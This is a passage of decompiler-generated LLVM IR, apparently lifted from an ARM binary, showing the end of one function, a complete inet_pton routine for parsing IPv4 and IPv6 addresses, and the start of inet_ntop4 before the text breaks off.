  %v0_18204 = phi i32 [ %v0_18204.pre, %dec_label_pc_181f4.dec_label_pc_18204_crit_edge ], [ 0, %entry ]
  %v7_18204 = icmp eq i32 %v0_18204, 3
  store i1 %v7_18204, i1* %cpsr_z.global-to-local, align 1
  %v7_18208 = icmp slt i32 %v0_18204, 4
  br i1 %v7_18208, label %dec_label_pc_18228, label %dec_label_pc_1820c

dec_label_pc_1820c:                               ; preds = %dec_label_pc_18204
  %v0_1820c = load i32, i32* @r4, align 4
  store i32 %v0_1820c, i32* @r0, align 4
  store i32 %v2_1817c, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_18218 = call i32 @memcpy()
  br label %dec_label_pc_18228

dec_label_pc_18228:                               ; preds = %dec_label_pc_181a0, %dec_label_pc_181bc, %dec_label_pc_181d0, %dec_label_pc_181e8, %dec_label_pc_18204, %dec_label_pc_1820c
  %storemerge = phi i32 [ 1, %dec_label_pc_1820c ], [ 0, %dec_label_pc_18204 ], [ 0, %dec_label_pc_181e8 ], [ 0, %dec_label_pc_181d0 ], [ 0, %dec_label_pc_181bc ], [ 0, %dec_label_pc_181a0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v3_18164, i32* @r4, align 4
  store i32 %v6_18164, i32* @r5, align 4
  store i32 %v15_18164, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_18204, { 1, 0 }
  uselistorder i32 %v3_181f4, { 2, 1, 0 }
  uselistorder i32 %v0_181f4, { 1, 0 }
  uselistorder i32 %storemerge12, { 1, 0 }
  uselistorder i32 %v2_181a4, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 5, 3, 4, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 4, 3, 5, 6, 7, 8, 9, 1, 2, 0 }
  uselistorder label %dec_label_pc_18228, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_181f4.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18194, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_18234 = load i32, i32* @r4, align 4
  %v6_18234 = load i32, i32* @r5, align 4
  %v9_18234 = load i32, i32* @r6, align 4
  %v12_18234 = load i32, i32* @r7, align 4
  %v27_18234 = load i32, i32* @lr, align 4
  %v7_18240 = icmp eq i32 %arg1, 2
  store i32 ptrtoint (i16* @global_var_26010.295 to i32), i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v7_18240, label %dec_label_pc_18260, label %dec_label_pc_18254

dec_label_pc_18254:                               ; preds = %entry
  %v7_18254 = icmp eq i32 %arg1, 10
  br i1 %v7_18254, label %dec_label_pc_18270, label %dec_label_pc_18428

dec_label_pc_18260:                               ; preds = %entry
  store i32 %tmp, i32* @r0, align 4
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v3_18268 = call i32 @inet_pton4(i32 %tmp, i32 %arg3)
  br label %dec_label_pc_18438

dec_label_pc_18270:                               ; preds = %dec_label_pc_18254
  %v2_18270 = ptrtoint i32* %stack_var_-56 to i32
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_1827c = bitcast i32* %stack_var_-56 to i8*
  %v3_1827c = call i32 @__GI_memset(i8* %v2_1827c, i32 0)
  %v0_18280 = load i32, i32* @r5, align 4
  %v1_18280 = inttoptr i32 %v0_18280 to i8*
  %v2_18280 = load i8, i8* %v1_18280, align 1
  %v3_18280 = zext i8 %v2_18280 to i32
  store i32 %v3_18280, i32* %r3.global-to-local, align 4
  %v7_18284 = icmp eq i8 %v2_18280, 58
  store i32 %v3_1827c, i32* @r6, align 4
  %v2_1828c = add i32 %v3_1827c, 16
  store i32 %v2_1828c, i32* %r8.global-to-local, align 4
  br i1 %v7_18284, label %dec_label_pc_18294, label %dec_label_pc_182a0

dec_label_pc_18294:                               ; preds = %dec_label_pc_18270
  %v1_18294 = add i32 %v0_18280, 1
  %v2_18294 = inttoptr i32 %v1_18294 to i8*
  %v3_18294 = load i8, i8* %v2_18294, align 1
  %v4_18294 = zext i8 %v3_18294 to i32
  store i32 %v4_18294, i32* %r3.global-to-local, align 4
  store i32 %v1_18294, i32* @r5, align 4
  %v7_18298 = icmp eq i8 %v3_18294, 58
  br i1 %v7_18298, label %dec_label_pc_182a0, label %dec_label_pc_18420

dec_label_pc_182a0:                               ; preds = %dec_label_pc_18294, %dec_label_pc_18270
  %v0_182ac = phi i32 [ %v1_18294, %dec_label_pc_18294 ], [ %v0_18280, %dec_label_pc_18270 ]
  store i32 -34140, i32* @r3, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v0_182a8 = load i32, i32* @r4, align 4
  %v2_182a8 = add i32 %v0_182a8, -34140
  store i32 %v0_182ac, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i32 %v2_182a8, i32* %stack_var_-64, align 4
  %v1_183843 = inttoptr i32 %v0_182ac to i8*
  %v2_183844 = load i8, i8* %v1_183843, align 1
  %v3_183845 = zext i8 %v2_183844 to i32
  store i32 %v3_183845, i32* @r4, align 4
  %v2_183886 = icmp eq i8 %v2_183844, 0
  br i1 %v2_183886, label %dec_label_pc_18390.thread, label %dec_label_pc_182c0

dec_label_pc_18390.thread:                        ; preds = %dec_label_pc_182a0
  store i32 %v3_1827c, i32* @r4, align 4
  br label %dec_label_pc_183bc

dec_label_pc_182c0:                               ; preds = %dec_label_pc_182a0, %dec_label_pc_18384.backedge.dec_label_pc_182c0_crit_edge
  %v0_182c4 = phi i32 [ %v3_18384, %dec_label_pc_18384.backedge.dec_label_pc_182c0_crit_edge ], [ %v3_183845, %dec_label_pc_182a0 ]
  %v2_182c0 = phi i32 [ %v2_182c0.pre, %dec_label_pc_18384.backedge.dec_label_pc_182c0_crit_edge ], [ %v2_182a8, %dec_label_pc_182a0 ]
  store i32 %v2_182c0, i32* @r0, align 4
  %v1_182c4 = or i32 %v0_182c4, 32
  store i32 %v1_182c4, i32* %r1.global-to-local, align 4
  %v2_182c8 = call i32 @__GI_strchr(i32 %v2_182c0, i32 %v1_182c4)
  %v2_182cc = icmp eq i32 %v2_182c8, 0
  %v0_182d0 = load i32, i32* @r5, align 4
  %v1_182d0 = add i32 %v0_182d0, 1
  store i32 %v1_182d0, i32* @r5, align 4
  br i1 %v2_182cc, label %dec_label_pc_182f4, label %dec_label_pc_182d8

dec_label_pc_182d8:                               ; preds = %dec_label_pc_182c0
  %v2_182d8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_182d8, i32* %r2.global-to-local, align 4
  %v2_182dc = sub i32 %v2_182c8, %v2_182d8
  %v1_182e0 = load i32, i32* @r7, align 4
  %v4_182e0 = mul i32 %v1_182e0, 16
  %v5_182e0 = or i32 %v4_182e0, %v2_182dc
  store i32 %v5_182e0, i32* @r7, align 4
  store i32 65535, i32* @r3, align 4
  %tmp36 = icmp ult i32 %v5_182e0, 65536
  br i1 %tmp36, label %dec_label_pc_18380, label %dec_label_pc_18420

dec_label_pc_182f4:                               ; preds = %dec_label_pc_182c0
  %v0_182f4 = load i32, i32* @r4, align 4
  %v7_182f4 = icmp eq i32 %v0_182f4, 58
  br i1 %v7_182f4, label %dec_label_pc_182fc, label %dec_label_pc_18354

dec_label_pc_182fc:                               ; preds = %dec_label_pc_182f4
  %v0_182fc = load i32, i32* %sb.global-to-local, align 4
  %v2_182fc = icmp eq i32 %v0_182fc, 0
  br i1 %v2_182fc, label %dec_label_pc_18304, label %dec_label_pc_18318

dec_label_pc_18304:                               ; preds = %dec_label_pc_182fc
  %v0_18304 = load i32, i32* %fp.global-to-local, align 4
  %v2_18304 = icmp eq i32 %v0_18304, 0
  br i1 %v2_18304, label %dec_label_pc_1830c, label %dec_label_pc_18420

dec_label_pc_1830c:                               ; preds = %dec_label_pc_18304
  %v0_1830c = load i32, i32* @r6, align 4
  store i32 %v0_1830c, i32* %fp.global-to-local, align 4
  store i32 %v1_182d0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18384.backedge

dec_label_pc_18318:                               ; preds = %dec_label_pc_182fc
  %v1_18318 = inttoptr i32 %v1_182d0 to i8*
  %v2_18318 = load i8, i8* %v1_18318, align 1
  %v3_18318 = zext i8 %v2_18318 to i32
  store i32 %v3_18318, i32* %r3.global-to-local, align 4
  %v2_1831c = icmp eq i8 %v2_18318, 0
  br i1 %v2_1831c, label %dec_label_pc_18420, label %dec_label_pc_18324

dec_label_pc_18324:                               ; preds = %dec_label_pc_18318
  %v0_18324 = load i32, i32* @r6, align 4
  %v1_18324 = add i32 %v0_18324, 2
  store i32 %v1_18324, i32* %r3.global-to-local, align 4
  %v1_18328 = load i32, i32* %r8.global-to-local, align 4
  %tmp37 = icmp ugt i32 %v1_18324, %v1_18328
  br i1 %tmp37, label %dec_label_pc_18420, label %dec_label_pc_18330

dec_label_pc_18330:                               ; preds = %dec_label_pc_18324
  %v0_18330 = load i32, i32* @r7, align 4
  %v3_18330 = udiv i32 %v0_18330, 256
  store i32 %v3_18330, i32* %r2.global-to-local, align 4
  store i32 %v0_18324, i32* %r3.global-to-local, align 4
  %v1_18338 = trunc i32 %v3_18330 to i8
  %v3_18338 = inttoptr i32 %v0_18324 to i8*
  store i8 %v1_18338, i8* %v3_18338, align 1
  %v4_18338 = load i32, i32* %r3.global-to-local, align 4
  %v5_18338 = add i32 %v4_18338, 1
  store i32 %v5_18338, i32* @r3, align 4
  %v0_1833c = load i32, i32* @r7, align 4
  %v1_1833c = trunc i32 %v0_1833c to i8
  %v2_1833c = load i32, i32* @r6, align 4
  %v3_1833c = add i32 %v2_1833c, 1
  %v4_1833c = inttoptr i32 %v3_1833c to i8*
  store i8 %v1_1833c, i8* %v4_1833c, align 1
  store i32 0, i32* @r7, align 4
  %v0_18344 = load i32, i32* @r3, align 4
  %v1_18344 = add i32 %v0_18344, 1
  store i32 %v1_18344, i32* @r6, align 4
  %v0_18348 = load i32, i32* @r5, align 4
  store i32 %v0_18348, i32* %sl.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18384.backedge

dec_label_pc_18354:                               ; preds = %dec_label_pc_182f4
  %v7_18354 = icmp eq i32 %v0_182f4, 46
  br i1 %v7_18354, label %dec_label_pc_1835c, label %dec_label_pc_18420

dec_label_pc_1835c:                               ; preds = %dec_label_pc_18354
  %v0_1835c = load i32, i32* @r6, align 4
  %v1_1835c = add i32 %v0_1835c, 4
  store i32 %v1_1835c, i32* @r4, align 4
  %v1_18360 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_1835c, %v1_18360
  br i1 %tmp38, label %dec_label_pc_18420, label %dec_label_pc_18368

dec_label_pc_18368:                               ; preds = %dec_label_pc_1835c
  %v0_18368 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_18368, i32* @r0, align 4
  store i32 %v0_1835c, i32* %r1.global-to-local, align 4
  %v3_18370 = call i32 @inet_pton4(i32 %v0_18368, i32 %v0_1835c)
  %v5_18378 = icmp sgt i32 %v3_18370, 0
  br i1 %v5_18378, label %dec_label_pc_18368.dec_label_pc_183bc_crit_edge, label %dec_label_pc_18420

dec_label_pc_18368.dec_label_pc_183bc_crit_edge:  ; preds = %dec_label_pc_18368
  %v0_18400.pre.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_183bc

dec_label_pc_18380:                               ; preds = %dec_label_pc_182d8
  store i32 1, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18384.backedge

dec_label_pc_18384.backedge:                      ; preds = %dec_label_pc_18380, %dec_label_pc_1830c, %dec_label_pc_18330
  %v0_18384 = phi i32 [ %v1_182d0, %dec_label_pc_18380 ], [ %v1_182d0, %dec_label_pc_1830c ], [ %v0_18348, %dec_label_pc_18330 ]
  %v0_1839012 = phi i32 [ 1, %dec_label_pc_18380 ], [ 0, %dec_label_pc_1830c ], [ 0, %dec_label_pc_18330 ]
  %v1_18384 = inttoptr i32 %v0_18384 to i8*
  %v2_18384 = load i8, i8* %v1_18384, align 1
  %v3_18384 = zext i8 %v2_18384 to i32
  store i32 %v3_18384, i32* @r4, align 4
  %v2_18388 = icmp eq i8 %v2_18384, 0
  br i1 %v2_18388, label %dec_label_pc_18390, label %dec_label_pc_18384.backedge.dec_label_pc_182c0_crit_edge

dec_label_pc_18384.backedge.dec_label_pc_182c0_crit_edge: ; preds = %dec_label_pc_18384.backedge
  %v2_182c0.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_182c0

dec_label_pc_18390:                               ; preds = %dec_label_pc_18384.backedge
  %v0_18394.pre = load i32, i32* @r6, align 4
  %v2_18390 = icmp eq i32 %v0_1839012, 0
  store i32 %v0_18394.pre, i32* @r4, align 4
  br i1 %v2_18390, label %dec_label_pc_183bc, label %dec_label_pc_1839c

dec_label_pc_1839c:                               ; preds = %dec_label_pc_18390
  %v1_1839c = add i32 %v0_18394.pre, 2
  store i32 %v1_1839c, i32* %r3.global-to-local, align 4
  %v1_183a0 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_1839c, %v1_183a0
  br i1 %tmp39, label %dec_label_pc_18420, label %dec_label_pc_183a8

dec_label_pc_183a8:                               ; preds = %dec_label_pc_1839c
  store i32 %v0_18394.pre, i32* %r3.global-to-local, align 4
  %v0_183ac = load i32, i32* @r7, align 4
  %v3_183ac = udiv i32 %v0_183ac, 256
  store i32 %v3_183ac, i32* %r2.global-to-local, align 4
  %v1_183b0 = trunc i32 %v3_183ac to i8
  %v3_183b0 = inttoptr i32 %v0_18394.pre to i8*
  store i8 %v1_183b0, i8* %v3_183b0, align 1
  %v4_183b0 = load i32, i32* %r3.global-to-local, align 4
  %v5_183b0 = add i32 %v4_183b0, 1
  store i32 %v5_183b0, i32* @r3, align 4
  %v0_183b4 = load i32, i32* @r7, align 4
  %v1_183b4 = trunc i32 %v0_183b4 to i8
  %v2_183b4 = load i32, i32* @r6, align 4
  %v3_183b4 = add i32 %v2_183b4, 1
  %v4_183b4 = inttoptr i32 %v3_183b4 to i8*
  store i8 %v1_183b4, i8* %v4_183b4, align 1
  %v0_183b8 = load i32, i32* @r3, align 4
  %v1_183b8 = add i32 %v0_183b8, 1
  store i32 %v1_183b8, i32* @r4, align 4
  br label %dec_label_pc_183bc

dec_label_pc_183bc:                               ; preds = %dec_label_pc_18368.dec_label_pc_183bc_crit_edge, %dec_label_pc_18390.thread, %dec_label_pc_18390, %dec_label_pc_183a8
  %v0_18400.pre = phi i32 [ %v0_18400.pre.pre, %dec_label_pc_18368.dec_label_pc_183bc_crit_edge ], [ %v3_1827c, %dec_label_pc_18390.thread ], [ %v0_18394.pre, %dec_label_pc_18390 ], [ %v1_183b8, %dec_label_pc_183a8 ]
  %v0_183bc = load i32, i32* %fp.global-to-local, align 4
  %v2_183bc = icmp eq i32 %v0_183bc, 0
  %v1_18400.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_183bc, label %dec_label_pc_18400, label %dec_label_pc_183c4

dec_label_pc_183c4:                               ; preds = %dec_label_pc_183bc
  %v9_183c4 = icmp eq i32 %v0_18400.pre, %v1_18400.pre
  %v2_183c8 = sub i32 %v0_18400.pre, %v0_183bc
  store i32 %v2_183c8, i32* @ip, align 4
  br i1 %v9_183c4, label %dec_label_pc_18420, label %dec_label_pc_183e8.preheader

dec_label_pc_183e8.preheader:                     ; preds = %dec_label_pc_183c4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_183e8

dec_label_pc_183dc:                               ; preds = %dec_label_pc_183e8
  %v2_183f0 = sub i32 %v0_183fc, %v0_183f4
  %v0_183dc = load i32, i32* %fp.global-to-local, align 4
  %v2_183dc = add i32 %v0_183dc, %v2_183ec
  %v3_183dc = inttoptr i32 %v2_183dc to i8*
  %v4_183dc = load i8, i8* %v3_183dc, align 1
  %v6_183dc = zext i8 %v4_183dc to i32
  store i32 %v6_183dc, i32* @r3, align 4
  %v3_183e0 = inttoptr i32 %v2_183f0 to i8*
  store i8 %v4_183dc, i8* %v3_183e0, align 1
  %v0_183e4 = load i32, i32* @lr, align 4
  %v1_183e4 = trunc i32 %v0_183e4 to i8
  %v2_183e4 = load i32, i32* %fp.global-to-local, align 4
  %v3_183e4 = load i32, i32* %r1.global-to-local, align 4
  %v4_183e4 = add i32 %v3_183e4, %v2_183e4
  %v5_183e4 = inttoptr i32 %v4_183e4 to i8*
  store i8 %v1_183e4, i8* %v5_183e4, align 1
  %v0_183e8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_183e8.pre = load i32, i32* @ip, align 4
  %v1_183f0.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_183e8

dec_label_pc_183e8:                               ; preds = %dec_label_pc_183e8.preheader, %dec_label_pc_183dc
  %v0_183fc = phi i32 [ %v1_18400.pre, %dec_label_pc_183e8.preheader ], [ %v1_183f0.pre, %dec_label_pc_183dc ]
  %v1_183ec = phi i32 [ %v2_183c8, %dec_label_pc_183e8.preheader ], [ %v1_183e8.pre, %dec_label_pc_183dc ]
  %v0_183f4 = phi i32 [ 1, %dec_label_pc_183e8.preheader ], [ %v0_183e8.pre, %dec_label_pc_183dc ]
  %v2_183e8 = sub i32 %v0_183f4, %v1_183ec
  %v4_183e8 = xor i32 %v0_183f4, %v1_183ec
  %v5_183e8 = xor i32 %v2_183e8, %v0_183f4
  %v6_183e8 = and i32 %v5_183e8, %v4_183e8
  %v7_183e8 = icmp slt i32 %v6_183e8, 0
  %v8_183e8 = icmp slt i32 %v2_183e8, 0
  %v9_183e8 = icmp eq i32 %v0_183f4, %v1_183ec
  %v2_183ec = sub i32 %v1_183ec, %v0_183f4
  store i32 %v2_183ec, i32* %r1.global-to-local, align 4
  %v1_183f4 = add i32 %v0_183f4, 1
  store i32 %v1_183f4, i32* %r2.global-to-local, align 4
  %v3_183f8 = xor i1 %v8_183e8, %v7_183e8
  %v4_183f8 = or i1 %v9_183e8, %v3_183f8
  br i1 %v4_183f8, label %dec_label_pc_183dc, label %dec_label_pc_183fc

dec_label_pc_183fc:                               ; preds = %dec_label_pc_183e8
  store i32 %v0_183fc, i32* @r4, align 4
  br label %dec_label_pc_18400

dec_label_pc_18400:                               ; preds = %dec_label_pc_183bc, %dec_label_pc_183fc
  %v0_18400 = phi i32 [ %v0_183fc, %dec_label_pc_183fc ], [ %v0_18400.pre, %dec_label_pc_183bc ]
  %v1_18400 = phi i32 [ %v0_183fc, %dec_label_pc_183fc ], [ %v1_18400.pre, %dec_label_pc_183bc ]
  %v9_18400 = icmp eq i32 %v0_18400, %v1_18400
  br i1 %v9_18400, label %dec_label_pc_18408, label %dec_label_pc_18420

dec_label_pc_18408:                               ; preds = %dec_label_pc_18400
  store i32 %arg3, i32* @r0, align 4
  store i32 %v2_18270, i32* @r1, align 4
  store i32 16, i32* @r2, align 4
  %v0_18414 = call i32 @memcpy()
  br label %dec_label_pc_18438

dec_label_pc_18420:                               ; preds = %dec_label_pc_182d8, %dec_label_pc_18304, %dec_label_pc_18324, %dec_label_pc_18318, %dec_label_pc_183c4, %dec_label_pc_18368, %dec_label_pc_18354, %dec_label_pc_18400, %dec_label_pc_18294, %dec_label_pc_1839c, %dec_label_pc_1835c
  br label %dec_label_pc_18438

dec_label_pc_18428:                               ; preds = %dec_label_pc_18254
  %v0_18428 = call i32 @__GI___errno_location()
  store i32 97, i32* %r3.global-to-local, align 4
  %v2_18430 = inttoptr i32 %v0_18428 to i32*
  store i32 97, i32* %v2_18430, align 4
  br label %dec_label_pc_18438

dec_label_pc_18438:                               ; preds = %dec_label_pc_18420, %dec_label_pc_18408, %dec_label_pc_18260, %dec_label_pc_18428
  %v1_18440 = phi i32 [ 0, %dec_label_pc_18420 ], [ 1, %dec_label_pc_18408 ], [ %v3_18268, %dec_label_pc_18260 ], [ -1, %dec_label_pc_18428 ]
  store i32 %v3_18234, i32* @r4, align 4
  store i32 %v6_18234, i32* @r5, align 4
  store i32 %v9_18234, i32* @r6, align 4
  store i32 %v12_18234, i32* @r7, align 4
  store i32 %v27_18234, i32* @lr, align 4
  ret i32 %v1_18440

; uselistorder directives
  uselistorder i32 %v2_183ec, { 1, 0 }
  uselistorder i32 %v2_183e8, { 1, 0 }
  uselistorder i32 %v0_183f4, { 2, 3, 6, 0, 1, 5, 4 }
  uselistorder i32 %v1_183ec, { 1, 3, 0, 2 }
  uselistorder i32 %v0_183fc, { 1, 0, 2, 3 }
  uselistorder i32 %v1_18400.pre, { 0, 2, 1 }
  uselistorder i32 %v0_18400.pre, { 2, 0, 1 }
  uselistorder i32 %v3_183ac, { 1, 0 }
  uselistorder i32 %v0_18394.pre, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v3_18384, { 1, 0 }
  uselistorder i32 %v0_1835c, { 1, 0, 2 }
  uselistorder i32 %v3_18330, { 1, 0 }
  uselistorder i32 %v0_18324, { 1, 0, 2 }
  uselistorder i32 %v1_182d0, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_182c0, { 1, 0 }
  uselistorder i32 %v0_182ac, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 3, 1, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 2, 4, 5, 6, 1, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_18438, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_18420, { 7, 4, 9, 5, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_18400, { 1, 0 }
  uselistorder label %dec_label_pc_183e8, { 1, 0 }
  uselistorder label %dec_label_pc_183bc, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_18384.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_182c0, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-57 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-72, align 4
  store i32 0, i32* %stack_var_-57, align 4
  %v2_18528 = ptrtoint i32* %stack_var_-40 to i32
  %v2_18508 = add i32 %v2_18528, -17
  br label %dec_label_pc_18528

dec_label_pc_18478:                               ; preds = %dec_label_pc_18528
  %v0_18478 = load i32, i32* %fp.global-to-local, align 4
  %v2_18478 = add i32 %v0_18478, %v1_18478
  %v3_18478 = inttoptr i32 %v2_18478 to i8*
  %v4_18478 = load i8, i8* %v3_18478, align 1
  %v6_18478 = zext i8 %v4_18478 to i32
  store i32 %v6_18478, i32* %r4.global-to-local, align 4
  %div4 = udiv i8 %v4_18478, 100
  %v2_18480 = zext i8 %div4 to i32
  store i32 %v2_18480, i32* %r0.global-to-local, align 4
  %v1_18484 = or i8 %div4, 48
  %v3_18488 = add i32 %v2_18538, -17
  %v4_18488 = inttoptr i32 %v3_18488 to i8*
  store i8 %v1_18484, i8* %v4_18488, align 1
  %v0_1848c = load i32, i32* %r5.global-to-local, align 4
  %v1_1848c = add i32 %v0_1848c, -17
  %v2_1848c = inttoptr i32 %v1_1848c to i8*
  %v3_1848c = load i8, i8* %v2_1848c, align 1
  %v0_18490 = load i32, i32* %r6.global-to-local, align 4
  %v1_18490 = add i32 %v0_18490, 1
  store i32 %v1_18490, i32* %r6.global-to-local, align 4
  store i32 %v2_18528, i32* %r2.global-to-local, align 4
  %v7_18498 = icmp eq i8 %v3_1848c, 48
  %v0_184a0 = load i32, i32* %r4.global-to-local, align 4
  %v0_184a8 = load i32, i32* %fp.global-to-local, align 4
  %v1_184a8 = load i32, i32* %sl.global-to-local, align 4
  %v2_184a8 = add i32 %v1_184a8, %v0_184a8
  store i32 %v2_184a8, i32* %sb.global-to-local, align 4
  %v2_184b0 = udiv i32 %v0_184a0, 10
  %v1_184b8 = urem i32 %v2_184b0, 256
  %v2_184bc = udiv i32 %v1_184b8, 10
  %v3_184bc = urem i32 %v1_184b8, 10
  store i32 %v2_184bc, i32* %r0.global-to-local, align 4
  %v1_184c0 = or i32 %v3_184bc, 48
  br i1 %v7_18498, label %dec_label_pc_184b0, label %dec_label_pc_184d8

dec_label_pc_184b0:                               ; preds = %dec_label_pc_18478
  %v7_184c8 = icmp eq i32 %v1_184c0, 48
  br i1 %v7_184c8, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_184b0
  store i32 %v1_18490, i32* %r7.global-to-local, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_184b0, %bb
  %v1_184d0 = trunc i32 %v1_184c0 to i8
  store i8 %v1_184d0, i8* %v2_1848c, align 1
  %v0_18504.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_184f4

dec_label_pc_184d8:                               ; preds = %dec_label_pc_18478
  %v2_184a4 = add i32 %v1_18490, %v2_18528
  %v1_184ec = trunc i32 %v1_184c0 to i8
  %v3_184ec = add i32 %v2_184a4, -17
  %v4_184ec = inttoptr i32 %v3_184ec to i8*
  store i8 %v1_184ec, i8* %v4_184ec, align 1
  %v0_184f0 = load i32, i32* %r6.global-to-local, align 4
  %v1_184f0 = add i32 %v0_184f0, 1
  store i32 %v1_184f0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_184f4

dec_label_pc_184f4:                               ; preds = %bb18, %dec_label_pc_184d8
  %v0_18504 = phi i32 [ %v0_18504.pre, %bb18 ], [ %v1_184f0, %dec_label_pc_184d8 ]
  %v0_184f4 = load i32, i32* %sb.global-to-local, align 4
  %v1_184f4 = inttoptr i32 %v0_184f4 to i8*
  %v2_184f4 = load i8, i8* %v1_184f4, align 1
  %tmp19 = urem i8 %v2_184f4, 10
  store i32 %v2_18528, i32* %ip.global-to-local, align 4
  %v1_18504 = add i32 %v0_18504, 1
  store i32 %v1_18504, i32* %r0.global-to-local, align 4
  %v1_1850c = or i8 %tmp19, 48
  %v3_18510 = add i32 %v2_18508, %v0_18504
  %v4_18510 = inttoptr i32 %v3_18510 to i8*
  store i8 %v1_1850c, i8* %v4_18510, align 1
  %v0_18514 = load i32, i32* %ip.global-to-local, align 4
  %v1_18514 = load i32, i32* %r0.global-to-local, align 4
  %v2_18514 = add i32 %v1_18514, %v0_18514
  store i32 %v2_18514, i32* %r2.global-to-local, align 4
  %v3_1851c = add i32 %v2_18514, -17
  %v4_1851c = inttoptr i32 %v3_1851c to i8*
  store i8 46, i8* %v4_1851c, align 1
  %v0_18520 = load i32, i32* %r0.global-to-local, align 4
  %v1_18520 = add i32 %v0_18520, 1
  store i32 %v1_18520, i32* %r6.global-to-local, align 4
  %v0_18524 = load i32, i32* %sl.global-to-local, align 4
  %v1_18524 = add i32 %v0_18524, 1
  store i32 %v1_18524, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18528

dec_label_pc_18528:                               ; preds = %entry, %dec_label_pc_184f4
  %v0_18534 = phi i32 [ 0, %entry ], [ %v1_18520, %dec_label_pc_184f4 ]
  %v1_18478 = phi i32 [ 0, %entry ], [ %v1_18524, %dec_label_pc_184f4 ]
  store i32 %v2_18528, i32* %ip.global-to-local, align 4
  store i32 %v0_18534, i32* %r7.global-to-local, align 4
  %v2_18538 = add i32 %v0_18534, %v2_18528
  store i32 %v2_18538, i32* %r5.global-to-local, align 4
  %v7_1853c = icmp sgt i32 %v1_18478, 3
  br i1 %v7_1853c, label %dec_label_pc_18540, label %dec_label_pc_18478

dec_label_pc_18540:                               ; preds = %dec_label_pc_18528
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_18544 = ptrtoint i32* %stack_var_-57 to i32
  store i32 %v2_18544, i32* %r4.global-to-local, align 4
  %v3_18548 = add i32 %v2_18538, -18
  %v4_18548 = inttoptr i32 %v3_18548 to i8*
  store i8 0, i8* %v4_18548, align 1
  %tmp20 = bitcast i32* %stack_var_-57 to i8*
  store i32 %v2_18544, i32* %r0.global-to-local, align 4
